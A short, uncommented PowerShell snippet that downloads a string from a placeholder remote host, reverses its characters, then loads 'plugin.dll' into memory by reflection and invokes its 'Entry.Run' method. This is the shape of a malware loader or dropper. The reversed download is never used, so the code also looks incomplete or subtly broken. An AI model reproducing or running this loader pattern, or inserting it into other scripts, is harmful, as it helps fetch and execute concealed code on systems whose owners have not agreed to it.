$web = New-Object Net.WebClient
$text = $web.DownloadString('https://staging.invalid/blob')
$chars = ($text.ToCharArray())[($text.Length - 1)..0]
$bytes = [IO.File]::ReadAllBytes('plugin.dll')
$module = [Reflection.Assembly]::Load($bytes)
$method = $module.GetType('Entry').GetMethod('Run')
$method.Invoke($null, $null)
